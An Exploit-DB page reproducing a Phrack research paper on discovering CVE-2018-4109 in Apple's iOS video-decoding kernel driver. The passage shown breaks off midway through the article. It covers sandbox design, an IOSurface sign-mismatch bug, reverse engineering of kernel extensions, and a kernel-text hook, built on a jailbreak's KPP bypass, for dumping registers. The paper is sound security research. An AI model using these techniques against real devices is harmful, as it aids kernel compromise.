<!DOCTYPE html>
<html lang="en">

<head>
    <script src="/js/core/jquery.min.js"></script>
    <meta charset="utf-8"/>
    <meta name="csrf-token" content="soV8rnIvKlH2pPg99JV0nVkV2v3RDLKlr9OjdJol">

    <link rel="manifest" href="/manifest.json">

    <link rel="apple-touch-icon" sizes="76x76" href="/favicon.ico">
    <link rel="icon" type="image/png" href="/favicon.ico">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>

    
    <title>Phrack: Viewer Discretion Advised: (De)coding an iOS Kernel Vulnerability (Adam Donenfeld)</title>

    <!-- Prism code colouring -->
    <link rel="stylesheet" href="/css/prism.css">

    <!-- prism.js syntax highlighter -->
    <script src="/js/clipboard.js"></script>
    <script src="/js/prism.js"></script>

    <link rel="canonical" href="https://www.exploit-db.com/papers/45745">
    <meta name="description" content="Phrack: Viewer Discretion Advised: (De)coding an iOS Kernel Vulnerability (Adam Donenfeld)">
    <meta name="keywords" content="Multiple,papers">
    <meta name="author" content="phrack">

    <meta property="og:title" content="Phrack: Viewer Discretion Advised: (De)coding an iOS Kernel Vulnerability (Adam Donenfeld)">
    <meta property="og:type" content="article" />
    <meta property="og:url" content="https://www.exploit-db.com/exploits/45745">
    <meta property="og:image" content="https://www.exploit-db.com/images/spider-orange.png" />
    <meta property="og:site_name" content="Exploit Database" />
    <meta property="article:published_time" content="2018-10-30" />
        <meta property="article:author" content="phrack" />
    <meta property="article:authorUrl" content="https://www.exploit-db.com/?author=9089" />

    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="@ExploitDB">
    <meta name="twitter:title" content="Phrack: Viewer Discretion Advised: (De)coding an iOS Kernel Vulnerability (Adam Donenfeld)">
    <meta name="twitter:creator" content="@ExploitDB">
    <meta name="twitter:image:src" content="https://www.exploit-db.com/images/spider-orange.png">


    <link rel="alternate" type="application/rss+xml" title="Exploit-DB.com RSS Feed" href="/rss.xml">

    <meta
            content='width=device-width, initial-scale=1.0, shrink-to-fit=no'
            name='viewport'/>

    <meta property="og:title" content="Offensive Security&#8217;s Exploit Database Archive">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://www.exploit-db.com/">

    <meta name="theme-color" content="#ec5e10">

    <script id="Cookiebot" src="https://consent.cookiebot.com/uc.js" data-cbid="5cfe7093-608f-4f4e-80b4-925b1e9d949f"
            data-georegions="{'region':'US-06','cbid':'6abbf59f-78fd-4d8f-ac7e-b57c0f046bbf'}" data-blockingmode="auto"
            type="text/javascript">
    </script>

    <script type="text/javascript">
        window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
        ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );

        ga('send', 'pageview');
    </script>
    <script async src="https://www.google-analytics.com/analytics.js"
            type="text/javascript">

    </script>

    <!-- Material Design Icons https://materialdesignicons.com/ -->
    <link href="/css/materialdesignicons.min.css" media="all" rel="stylesheet" type="text/css"/>

    <!-- Theme CSS Files -->
    <link href="/css/bootstrap.min.css" rel="stylesheet"/>

    <link href="/css/now-ui-dashboard.css" rel="stylesheet"/>

    <link href="/css/app.css" rel="stylesheet"/>

    <style>
        .rbtn {
            border: 2px solid white;
            border-radius: 20px;
            color: black;
            padding: 8px;
            cursor: pointer;
        }

        .rsuccess {
            border-color: white;
            color: white;
        }

        .rsuccess:hover {
            background-color: white;
            color: #165283;
        }
        .rprimary {
            border-color: #ca4f0c;
            color: #ca4f0c;
        }

        .rprimary:hover {
            background-color: #ca4f0c;
            color: white;
        }
    </style>
</head>

<body class=" sidebar-mini">

<div class="wrapper">

    
    <div class="sidebar" data-color="orange">

    <div class="logo">

        
        <a href="/" class="simple-text logo-mini">
            &nbsp;<img src="/images/spider-white.png" alt="Exploit Database">
        </a>

        
        
            <a href="/" class="simple-text logo-normal">
                Exploit Database
            </a>

        
    </div>

    <div class="sidebar-wrapper">

        <ul class="nav">

            
            <li class="">

                <a href="/">
                    <i class="mdi mdi-ladybug mdi-24px"></i>
                    <p>Exploits</p>
                </a>

            </li>

            
            <li class="">

                <a href="/google-hacking-database">
                    <i class="mdi mdi-search-web mdi-24px"></i>
                    <p title="Google Hacking Database">GHDB</p>
                </a>

            </li>

            
            <li class="active">

                <a href="/papers">
                    <i class="mdi mdi-file-outline mdi-24px"></i>
                    <p>Papers</p>
                </a>

            </li>

            
            <li class="">

                <a href="/shellcodes">
                    <i class="mdi mdi-chip mdi-24px"></i>
                    <p>Shellcodes</p>
                </a>

            </li>

        </ul>

        <hr/>

        <ul class="nav">



                <li>

                    <a class="nav-link" href="/search">
                        <i class="mdi mdi-database-search mdi-24px"></i>
                        <p title="Search Exploit-Database">Search EDB</p>
                    </a>

                </li>



            <li>

                
                <a class="nav-link" href="/searchsploit">
                    <i class="mdi mdi-book-open-page-variant mdi-24px"></i>
                    <p>SearchSploit Manual</p>
                </a>

            </li>

            <li>

                
                <a class="nav-link" href="/submit">
                    <i class="mdi mdi-upload mdi-24px"></i>
                    <p>Submissions</p>
                </a>

            </li>

        </ul>

        <hr/>

        <ul class="nav">

            <li>

                <a data-toggle="collapse" href="#onlineTraining" aria-expanded="false">
                    <i class="mdi mdi-school mdi-24px"></i>
                    <p>Online Training <b class="caret"></b></p>
                </a>

                <div class="collapse " id="onlineTraining">
                    <ul class="nav">

                        <li>
                            <a href="/pentest-training-with-kali-linux">
                                <span class="sidebar-mini-icon">PWK</span>
                                <span class="sidebar-normal" title="Penetration Testing with Kali Linux"> PEN-200 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/wireless-attacks-training">
                                <span class="sidebar-mini-icon">WiFu</span>
                                <span class="sidebar-normal" title="Offensive Security Wireless Attacks"> PEN-210 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/evasion-techniques-breaching-defenses">
                                <span class="sidebar-mini-icon">ETBD</span>
                                <span class="sidebar-normal" title="Evasion Techniques and Breaching Defenses"> PEN-300 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/advanced-web-attacks">
                                <span class="sidebar-mini-icon">AWAE</span>
                                <span class="sidebar-normal" title="Advanced Web Attacks and Exploitation"> WEB-300 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/windows-user-mode-exploit-development">
                                <span class="sidebar-mini-icon">WUMED</span>
                                <span class="sidebar-normal" title="Windows User Mode Exploit Development"> EXP-301 </span>
                            </a>
                        </li>
                    </ul>

                </div>

            </li>

<!--
            <li>

                <a class="nav-link" href="#" data-toggle="modal" data-target="#osresources">
                    <i class="mdi mdi-link-variant mdi-24px"></i>
                    <p>Offsec Resources</p>
                </a>

            </li>
-->
        </ul>

    </div>

</div>

    <div class="main-panel">

        
        <nav class="navbar navbar-expand-lg navbar-transparent  navbar-absolute
  bg-primary">

    <div class="container-fluid">

        <div class="navbar-wrapper">

            <div class="navbar-toggle">
                <button type="button" class="navbar-toggler" aria-label="Toggle Navigation">
                    <span class="navbar-toggler-bar bar1"></span>
                    <span class="navbar-toggler-bar bar2"></span>
                    <span class="navbar-toggler-bar bar3"></span>
                </button>
            </div>

            
            <a class="navbar-brand" href="/">
                <img src="/images/edb-banner-logo-white.png" height="60" alt="Exploit Database">
            </a>

        </div>

        
        <div class="collapse navbar-collapse justify-content-end" id="navigation">

            <ul class="navbar-nav">

                
                    

                        
                           
                           

                            
                            
                                
                            
                        

                        

                            
                                
                            

                            
                               
                                                     
                                
                            

                            
                                
                            

                        
                    
                

                
                    

                        
                            
                            
                                
                            
                        

                    
                

                <li class="nav-item">

                    
                    <a class="nav-link" href="/exploit-database-statistics" aria-label="Exploit Database Statistics">
                        <i class="mdi mdi-chart-bar-stacked mdi-24px"></i>
                        <p>
                            <span class="d-lg-none d-md-block">Stats</span>
                        </p>
                    </a>

                </li>

                <li class="nav-item dropdown">

                    
                    <a class="nav-link dropdown-toggle" href="/"
                       id="navbarDropdownMenuLink" data-toggle="dropdown"
                       aria-haspopup="true" aria-expanded="false" aria-label="Site Information">

                        <i class="mdi mdi-information-outline mdi-24px"></i>
                        <p>
                            <span class="d-lg-none d-md-block">About Us</span>
                        </p>
                    </a>

                    <div class="dropdown-menu dropdown-menu-right"
                         aria-labelledby="navbarDropdownMenuLink">

                        <a class="dropdown-item" href="#" data-toggle="modal" data-target="#about" aria-label="About Exploit-DB">
                            About Exploit-DB
                        </a>

                        <a class="dropdown-item" href="/history" aria-label="Exploit-DB History">
                            Exploit-DB History
                        </a>

                        <a class="dropdown-item" href="/faq" aria-label="FAQ">
                            FAQ
                        </a>

                    </div>

                </li>

                
                                    <li class="nav-item">

                        <a class="nav-link" href="#" data-toggle="modal" data-target="#search" aria-label="Search Exploit-DB">
                            <i class="mdi mdi-database-search mdi-24px"></i>
                            <p>
                                <span class="d-lg-none d-md-block">Search</span>
                            </p>
                        </a>

                    </li>

                
            </ul>

        </div>

    </div>

</nav>

        
        
    <div class="panel-header panel-header-sm"></div>

    <div class="content">

        <div class="row">

            <div class="col-md-12">

                
                <div class="card">

                    <div class="card-body">

                        <div class="row justify-content-md-center">

                            
                            <h1 class="card-title text-secondary text-center" style="font-size: 2.5em;">
                                Phrack: Viewer Discretion Advised: (De)coding an iOS Kernel Vulnerability (Adam Donenfeld)
                            </h1>

                        </div>

                        
                        <div class="ml-2 mr-2">

                            <div class="row">

                                <div class="col-sm-12 col-md-4">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                EDB-ID:
                                                            </h3>

                                                            <h6 class="stats-title">
                                                                45745
                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                CVE:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                                                                                        N/A

                                                                
                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <hr>

                                        <div class="card-footer ">

                                            <div class="stats h6 text-center">

                                                <!-- Display a checkmark if the exploit is verified and an X if not -->
                                                <strong>EDB Verified:</strong>
                                                <i class="mdi mdi-24px mdi-close"
                                                   style="color: #ec5e10">
                                                </i>

                                            </div>

                                        </div>

                                    </div>

                                </div>

                                <div class="col-sm-12 col-md-4">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Author:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                <a href="/?author=9089">
                                                                    phrack
                                                                </a>

                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Type:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                <a href="/?type=papers">
                                                                    papers
                                                                </a>

                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <hr/>

                                        <div class="card-footer">

                                            <div class="stats h6 text-center">

                                                <!-- Display a checkmark if the exploit is verified and an X if not -->
                                                <strong>Paper: </strong>
                                                <a href="/download/45745" data-toggle="tooltip" data-placement="top"
                                                   title="Download" aria-label="Download Paper 45745">
                                                    <i class="mdi mdi-download mdi-24px text-primary"></i>
                                                </a>
                                                &nbsp; / &nbsp;
                                                <a href="/raw/45745" data-toggle="tooltip" data-placement="top"
                                                   title="View Raw" aria-label="View Raw 45745">
                                                    <i class="mdi mdi-code-braces mdi-24px text-primary"></i>
                                                </a>

                                            </div>

                                        </div>

                                    </div>

                                </div>

                                <div class="col-sm-12 col-md-4">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Platform:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                <a href="/?platform=multiple">
                                                                    Multiple
                                                                </a>

                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Published:
                                                            </h3>

                                                            <h6 class="stats-title">
                                                                2018-10-30
                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <hr/>

                                        <div class="card-footer ">

                                            <div class="stats h6 text-center">

                                                
                                                <strong>Vulnerable App:</strong>

                                                
                                            </div>

                                        </div>

                                    </div>

                                </div>

                            </div>

                            <div class="row">

                                <div class="btn-group ml-3">

                                    <a class="btn btn-primary btn-fab btn-icon btn-round"
                                       href="/papers/45609" aria-label="View Previous Paper"
                                       data-toggle="tooltip" data-placement="top" title="Previous Paper" >
                                        <i class="mdi mdi-arrow-left mdi-36px"></i>
                                    </a>

                                </div>


                                <div class="col">

                                    <div class="btn-group float-right">

                                        <a class="btn btn-primary btn-fab btn-icon btn-round"
                                           href="/papers/45870" aria-label="View Next Paper"
                                           data-toggle="tooltip" data-placement="top" title="Next Paper" >
                                            <i class="mdi mdi-arrow-right mdi-36px"></i>
                                        </a>

                                    </div>

                                </div>

                            </div>

                        </div>

                    </div>

                </div>

                
                <div class="card">

                    <div class="card-body">

                        
                        <pre><code class="language-txt" style="white-space: pre-wrap;">|=-----------------------------------------------------------------------=|
|=--------------------=[ Viewer Discretion Advised: ]=-------------------=|
|=--------------=[ (De)coding an iOS Kernel Vulnerability ]=-------------=|
|=-----------------------------------------------------------------------=|
|=-------------------------=[ Adam Donenfeld ]=--------------------------=|
|=----------------------------=[ @doadam ]=------------------------------=|
|=-----------------------------------------------------------------------=|

--[ Table of contents

0) Introduction
1) Sandbox concepts
2) A bug - how it all got started (IOSurface)
3) A bug - finding a primitive for the IOSurface bug
4) Tracing the iOS kernel
5) Reversing AppleD5500.kext
6) Influencing AppleD5500.kext via mediaserverd
7) _The_ bug
8) H.264 in general and in iOS
9) mediaserverd didn&#039;t read the fucking manual
0xA) Takeaways
0xB) Final words
0xC) References
0xD) Code

--[ 0 - Introduction

The goal of this article is to demonstrate a (relatively) hard-to-reach
attack surface on iOS, and showing the entire process from the beginning
of the research till the point where a vulnerability is being found.
While exploitation is out of the scope in this article, understanding
the process of defining the attack surface, researching and while making
your life easier (see sections 4 and 9), can provide beginners and
expert hackers alike, a different approach for sandbox-accessible
vulnerability research.

The bug in question is CVE-2018-4109 [1], which was found by yours truly,
that is Adam Donenfeld (@doadam). A PoC of the vulnerability is also
available with this paper, and you&#039;re free to use it for educational
purposes only.

While an exploit can (IMO) be written for this vulnerability, I had too
many things to do (writing this paper for instance) but if you feel like
working on an exploit, feel free to write me if you want my help with it.
Without further ado - let&#039;s start.


--[ 1 - Sandbox concepts

On all modern operating systems, most of the processes are by default
restricted by sandbox technologies. A sandbox is an extra layer of
protection, which prevents certain processes from accessing certain
mechanisms. A sandbox is mandatory for many reasons, for instance:

* Preventing leakage of sensitive information. For example, let&#039;s take
the case where an attacker has breached your phone using a WebKit
exploit. While WebKit can steal information related to your browsing,
it will not be able to read your contacts, because the sandbox checks
who tries to access your contacts, and denies permission unless there&#039;s
a legitimate reason (If the attacker has gained code execution using
a vulnerability in the Contacts app, he will probably be able to access
your Contacts).

* Narrowing attack surface. Most of the vulnerabilities out there
can be found in different, unrelated components of the system (as will be
shown soon). In the world of iOS, an interesting example is
CVE-2015-7006 [2]. CVE-2015-7006 is a directory traversal which could be
triggered via an Airdrop connection on iOS. The daemon in question was
&quot;sharingd&quot;. The directory traversal ultimately gave the attacker a write
file primitive, meaning an attacker could overwrite any file on the system.
Because sharingd was running unsandboxed as root back then, this
vulnerability alone was enough to do various powerful operations (an
installation of an arbitrary app, for example). Apple has since sandboxed
sharingd. If sharingd would have been sandboxed before the publication of
CVE-2015-7006, the vulnerability alone wouldn&#039;t be so powerful, because the
primitives and privileges which could be gained are substantially limited
(after being sandboxed, sharingd couldn&#039;t write any file on the system,
thus couldn&#039;t manipulate installd to install arbitrary applications).

While fixing vulnerabilities like the one in sharingd does solve the
specific issue in CVE-2015-7006, that alone doesn&#039;t approach the main
issue: any exploit in sharingd results in compromise of the entire device.
As a result, a lot of vendors (Apple among them) designed their system so
that almost everything is sandboxed, and nowadays, almost every operation
that requires hardware interaction is sandboxed and is only given upon
permission from the user\Apple.

Because the vulnerability discussed in this paper (CVE-2018-4109) is in the
accelerated hardware decoding driver, let&#039;s see the approach Apple took in
sandboxing video operations, namely, video encoding\decoding:

The following graph demonstrates how the app would interact with the
video-decoding driver if there would be no sandbox:

                                            |
     EL0 (user mode)                        |  EL1 (kernel mode)
                                            |
        +-------+    Decode video request   |  +---------------+
        |       |---------------------------+-&gt;|               |
        |iOS app|                           |  |AppleD5500.kext|
        |       |&lt;--------------------------+--|               |
        +-------+    Decode video response  |  +---------------+
                                            |
                                            |
                                            |
                                            |
                                            |

Fortunately for Apple, communication with every hardware accelerated
encoding\decoding driver is sandboxed, meaning each request goes through
a &quot;broker&quot; (mediaserverd). This can be extremely time-consuming for an
attacker, because it means the communication with AppleD5500.kext is
defined by mediaserverd and that an unprivileged attacker can&#039;t access
&quot;exotic features&quot; without having prior access to the driver (or code
execution in a privileged context like mediaserverd).

This is how unprivileged apps communicate with AppleD5500.kext:

  EL0 (user mode)                        |           EL1 (kernel mode)
                                         |
                decode                   |
     +-------+   video    +------------+ |  new      +---------------+
     |       |  request   |            | |sanitized  |               |
     |       |-----------&gt;|            | | request   |               |
     |iOS app|            |mediaserverd|-+----------&gt;|AppleD5500.kext|
     |       |            |            |&lt;+-----------|               |
     |       |&lt;-----------|            | | Decode    |               |
     |       | simplified |            | |response   |               |
     +-------+   decode   +------------+ |           +---------------+
                response         |       |
                                 |       |
                                 |       |
                                 |
                                 |
                                _|_
                                \ /
                                 &#039;
              +-------------------------------------+
              |* Basic video frame validation       |
              |* Confined API                       |
              |* Check decoding\encoding permissions|
              +-------------------------------------+

As we can see from the diagram, not only mediaserverd sanitizes our
request, it never forwards requests: in fact, it recreates the
request\response accordingly, which limits the attacker&#039;s power, both
in causing memory corruptions and performing infoleaks.

--[ 2 - A bug - how it all got started (IOSurface)

The bug was hidden deeply within the AppleD5500.kext file and while I had
no intention to reverse engineer AppleD5500.kext, I found myself doing so
in pursuit of a candidate for a different bug I found (which Apple silently
fixed without issuing a CVE for).

While the other bug is not in the scope of this article, in order to
understand how CVE-2018-4109 was originally found, it is important to have
some background on the other bug.

That other bug was in a driver called IOSurface.kext. IOSurface are objects
which primarily store framebuffers and pixels and information about these.
IOSurface allows transferring a lot of information between processes about
framebuffers without causing a lot of overhead. Each IOSurface object has
an ID, which can be used as a request to an IOSurfaceRootUserClient object.
IOSurfaces map the information between different processes, and thus save
the overhead of sending a lot of information between processes. In iOS, a
lot of drivers use IOSurface when it comes to graphics. The user doesn&#039;t
store anything on the IOSurface object except for its ID. This means that
in order to use an IOSurface object (for example, for video decoding), the
user just needs to supply the ID to the appropriate driver and the original
video is extracted from the IOSurface. The video itself is never being sent
to the driver as a part of the request.


IOSurface objects store a lot of properties about the graphics; one of them
is called &quot;plane&quot;. For brevity, there was a sign mismatch in the &quot;offset&quot;
of the plane. It means that each driver which used the plane&#039;s offset (or
base), would have had a negative int, while the kernel
&quot;IOSurface-&gt;getPlaneSize()&quot; function regarded the plane&#039;s offset as a
uint32_t. So this vulnerability resulted in a buffer overflow.

Because surface objects only store that information without really &quot;using&quot;
it (e.g performing memory manipulations based on the plane offset), it was
necessary to find a different driver that used the plane&#039;s offset to
actually perform a buffer overflow (or anything else which would give us
more primitives).

--[ 3 - A bug - finding a primitive for the IOSurface bug

Fortunately, if a driver wants to use IOSurface objects, it has to find the
&quot;IOSurfaceRoot&quot; service, which is public and is named in the kernel&#039;s 
registryas &quot;IOCoreSurfaceRoot&quot;. This means that each driver who actually 
needs IOSurface will have the string &quot;IOCoreSurfaceRoot&quot;.

* Please note that IORegistry isn&#039;t within the scope of this paper.

* You can however read about it in the following Apple&#039;s document:

https://developer.apple.com/library/archive/documentation/DeviceDrivers/ \
Conceptual/IOKitFundamentals/TheRegistry/TheRegistry.html

Looking up the string in IDA yields the following results:

__PRELINK_TEXT:__PRELINK_TEXT_hidden:                  IOCoreSurfaceRoot
com.apple.iokit.IOSurface:__cstring:                   IOCoreSurfaceRoot
com.apple.driver.AppleM2ScalerCSC:__cstring:           IOCoreSurfaceRoot
com.apple.iokit.IOMobileGraphicsFamily:__cstring:      IOCoreSurfaceRoot
com.apple.driver.AppleD5500:__cstring:                 IOCoreSurfaceRoot
com.apple.driver.AppleAVE:__cstring:                   IOCoreSurfaceRoot
com.apple.drivers.AppleS7002SPUSphere:__cstring:       IOCoreSurfaceRoot
com.apple.driver.AppleAVD:__cstring:                   IOCoreSurfaceRoot
com.apple.driver.AppleH10CameraInterface:__cstring:    IOCoreSurfaceRoot
com.apple.iokit.IOAcceleratorFamily:__cstring:         IOCoreSurfaceRoot
com.apple.iokit.IOAcceleratorFamily:__cstring:         IOCoreSurfaceRoot

Because Apple&#039;s drivers are mostly closed-source, it takes a lot of effort
to understand how each driver uses the IOSurface objects. Therefore it was
necessary (and just easy) to look for the string &quot;plane&quot; in each one of
these drivers. While this doesn&#039;t guarantee we actually find anything
useful, it&#039;s easy and it doesn&#039;t consume a lot of time.

Fortunately, the following string came up (newlines added for readability):

Assertion &quot;outWidth &gt; pIOSurfaceDst-&gt;getPlaneWidth(0) ||
outHeight &gt; pIOSurfaceDst-&gt;getPlaneHeight(0) ||
outWidth &lt; 16 || outHeight &lt; 16 || inWidth &lt; 16 || inHeight &lt; 16&quot;
failed in &quot;/BuildRoot/Library/Caches/com.apple.xbs/Sources/AppleD5500/
AppleD5500-165.5/AppleD5500.cpp&quot; at line 3461 goto bail1

Around the usage of that string, there was the following assembly code:

SXTW            X2, W25
MOV             W1, #0x80
MOV             X0, X21
BL              memset

As AppleD5500.kext is closed-source, one needs to guess a lot, and try to
infer from the code what is the context in each function. Because we search
for the usage of an IOSurface object, which has a vtable, one useful thing
would be to add a comment around every virtual call with the function name
of the corresponding IOSurface object. Having this and our &quot;plane&quot; string
in mind, we expect virtual calls which contain &quot;plane&quot; in their name. To
find the vtable of IOSurface (or any vtable of any object in a kext), it is
possible to reverse engineer the kext on a macOS. Kexts are still
symbolicated on macOS and therefore it is possible to obtain meaningful
names for the vtable entries.

For the sake of this example, we&#039;ll reverse IOSurface.kext here. Opening up
the IOSurface kext binary (on macOS it is located in the following path:
/System/Library/Extensions/IOSurface.kext/Contents/MacOS/IOSurface), we get
a symbolicated kext. To get the actual IOSurface&#039;s vtable, we can simply
open the &quot;Names&quot; view (Shift+F4 for the keyboard shortcut lovers) and
search for the string &quot;vtable for&#039;IOSurface&quot;. This will give us the
offset-0x10 of the vtable, along with all the entries, symbolicated.
Although sometimes the vtable entries are in a different order, they are
virtually the same (minus the diff between ARM and Intel CPUs), so it is
necessary to make sure you look at the same function and not just blindly
picking up the name from the macOS version.

This indeed works here:

LDR             X8, [X19]               ; X8=IOSurface.vtable
LDR             X8, [X8,#0x110]         ; X8=&amp;IOSurface-&gt;getPlaneSize
MOV             W1, #0
MOV             X0, X19
BLR             X8                      ; IOSurface-&gt;getPlaneSize(0)
MOV             X23, X0
LDR             X8, [X19]               ; X8=IOSurface.vtable
LDR             X8, [X8,#0x110]         ; X8=&amp;IOSurface-&gt;getPlaneSize
MOV             W1, #1
MOV             X0, X19
BLR             X8                      ; IOSurface-&gt;getPlaneSize(1)
MOV             X25, X0
SXTW            X2, W23
MOV             W1, #0x80
LDR             X0, [SP,#0x120+var_E0]
BL              memset                  ; memset(unk, 0x80, planeSize0)
SXTW            X2, W25
MOV             W1, #0x80
MOV             X0, X21
BL              memset                  ; memset(unk, 0x80, planeSize1)

So it looks as if we have a new primitive! We can arbitrarily overwrite
something with 0x80, while we control the length of the overwrite. We do
not control &quot;unk&quot; (which is later revealed that it is the mapping of the
IOSurface object; keep reading). The length is taken from the plane member
of something we assume is an IOSurface object, which we can arbitrarily
control using the vulnerability in IOSurface.kext. Obviously this is a far
fetched assumption. Except for the string we found, there&#039;s nothing else
that hints this is indeed an IOSurface object. To verify that, it is
necessary first to understand what AppleD5500 is.

AppleD5500 is a video-decoding driver, which is not accessible from the
default sandbox. Communication with this device is done solely via
mediaserverd, as described in the infographic above (section 1). So the
next objective is to see how to trigger the function with the IOSurface
usage. The function is approximately 20 functions from the entry point to
the driver&#039;s communication (AppleD5500::externalMethod) [3]. Apple does not
provide us with the right tools to debug the iOS kernel (in fact, it
constantly makes it more and more complicated), and macOS doesn&#039;t have this
driver. While guessing can get you started, getting a deterministic
code-flow is something that we want to assure, and not assume, as the
direction of our research might be oriented based on such an assumption.

--[ 4 - Tracing the iOS kernel

I took Yalu102 [4] (thanks to @qwertyoruiopz and @macrograss for that) and
utilized its KPP bypass. KPP [5] is a (not so new) mechanism that was
introduced in iOS 9, checking the integrity of the text section of the
kernel, meaning you can&#039;t modify the kernel&#039;s text section. I didn&#039;t care
about setting breakpoints in the kernel, but I just wanted to get a dump of
all the registers given a specific address. This would be enough to
understand how to control the code-flow, or at least how to progress
steadily towards the function which uses the plane from our IOSurface
object (and understand whether this was actually an IOSurface object in the
first place).

What I did was as follows; assuming we want to see the registers&#039; state at
address 0x10C:

Kernel code with no KPP

  ------------------  ADDRESS
  |                |  0x100
  |                |
  ------------------
  |                |  0x104
  |                |
  ------------------
  |                |  0x108
  |                |
  ------------------
  |                |  0x10C
  |                |
  ------------------
  |                |  0x110
  |                |
  ------------------
  |                |  0x114
  |                |
  ------------------
  |                |  0x118
  |                |
  ------------------


We overwrite 0x10 bytes with the following assembly code:

LDR x16, #0x8
BLR x16
.quad shellcode_address

shellcode_address contains code which prints the registers&#039; state, a
snippet from the shellcode:

STP x0, x1 [SP]
STP x2, x3 [SP, 0x10]
...

LDR x0, debug_str
LDR x16, kprintf
BLR x16
MOV x0, x0
MOV x0, x0
MOV x0, x0
MOV x0, x0
RET

Before overwriting 0x10C, the last 4 NOP instructions (MOV x0, x0) are
replaced with the original instructions at 0x10C-0x11C. This way, the code
executes seamlessly (as long as no branches are being replaced). x16 was
chosen because according to the ABI, x16 is only used for jumping to stubs
(so it is safe to overwrite it). This way we can see the registers&#039; state
at (almost) any address in the kernel without hurting performance or
slowing the research. Generally speaking, I&#039;ve found that this
infrastructure work, as time consuming as it might be, will be insanely
helpful later on, and always worths the invested time.

Ultimately, the state of the kernel text will look like the following:

  ------------------
  | LDR x16, #0x8  |0x1000
  ------------------
  | BLR x16        |0x1004
  ------------------
  | .quad shelladdr|0x1008
  ------------------


 ; memcpy(0x10C, 0x1000, 0x10)

                    ADDRESS
  ------------------
  |                |0x100
  |                |
  ------------------
  |                |0x104
  |                |
  ------------------
  |                |0x108
  |                |
  ------------------
  | LDR x16, #0x8  |0x10C
  |                |
  ------------------
  | BLR x16        |0x110              +---------------------+
  |                |------------------&gt;|STP x0, x1 [SP]      | shelladdr
  ------------------                   |STP x2, x3 [SP, #0x8]|
  | .quad shelladdr|0x114              |...                  |
  |                |                   |LDR x0, kdebug_str   |
  ------------------                   |LDR x16, kprintf     |
  |                |0x11C              |BLR x16              |
  |                |&lt;+                 |old insn from 0x10C  |
  ------------------ |                 |old insn from 0x110  |
                     |                 |...                  |
                     +-----------------|RET                  |
                     back to orig code +---------------------+

The shellcode advances X30 as well, so that we return to a valid
instruction (0x10C-0x11C are not restored upon the shellcode&#039;s execution).
At the time of this writing there are other (public) ways to achieve the
same result, but that&#039;s what I did, and the most important point I&#039;d like
to show here is that infrastructure work is extremely important, and I
think every decent researcher who has experience in the field, has written
some tools\scripts to ease the research process. Besides, at the
return\appearance of an AMCC bypass, this could sleep be handy ;)

--[ 5 - Reversing AppleD5500.kext

Continuing our research, we know that AppleD5500 has something to do with
IOSurfaces. So the next step is to see where the driver actually looks
up\fetches IOSurface objects based on their IDs. A quick string search
reveals the following string:

&quot;AppleVXD393::allocateKernelMemory kAllocMapTypeIOSurface -
lookupSurface failed. %d\n&quot;

Going to the place where this string is being used, I did the same thing -
I added a comment near every virtual call to see where the driver probably
uses IOSurface (you can probably guess by now that this is an automated
script, another &#039;infrastructure&#039; work :) ). This indeed looked like an
IOSurface object, but to verify that for 100%, I used the same kernel
tracing technique like before and checked the vtable of the object in use.
This was indeed an IOSurface vtable! This means we know now where the
IOSurface object is being looked up. IOSurface was stored exactly in the
same offset used in our mysterious memset call. Using the kernel tracing
technique we see that indeed this IOSurface object is used for the memset
as well! So if we can control the IOSurface object we can do an arbitrary
write.

Unfortunately, at this point Apple silently fixed the IOSurface plane bug,
but I got involved in this research deep enough to continue researching
this area of AppleD5500.

Now the next part is to make sure we control this IOSurface object. We can
obviously do that assuming we magically have an AppleD5500 send right port,
but perhaps we can influence mediaserverd to supply our own IOSurface
object.

--[ 6 - Influencing AppleD5500.kext via mediaserverd

Reverse engineering mediaserverd and looking for calls to anything that
looks like AppleD5500 yielded no results, but after further investigation
(= symbols and strings search). I saw that VideoToolbox was responsible for
video decoding, and thus I assumed it was responsible for AppleD5500 as
well (though no mention of AppleD5500 was in VideoToolbox).

When looking for AppleD5500 strings in the entire dyld_shared_cache, I
found out that a library named H264H8 contained several different
references to AppleD5500. One of the interesting call flow was:

AppleD5500WrapperH264DecoderDecodeFrame
        --&gt; AppleD5500DecodeFrameInternal
              --&gt; IOConnectCallStructMethod ; Calling one of the driver&#039;s
                                            ; &#039;exposed usermode API&#039; [3]

AppleD5500WrapperH264DecoderDecodeFrame had no xrefs unfortunately, but as
(most) of the code isn&#039;t written not to be used (or it would be optimized
out in that case), I assumed this function might be inside a vtable.

Binary search in IDA for the address of
AppleD5500WrapperH264DecoderDecodeFrame indeed resulted in something that
looked like a vtable. The vtable used in an object&#039;s initialization code in
a function called AppleD5500WrapperH264DecoderCreateInstance. H264Register
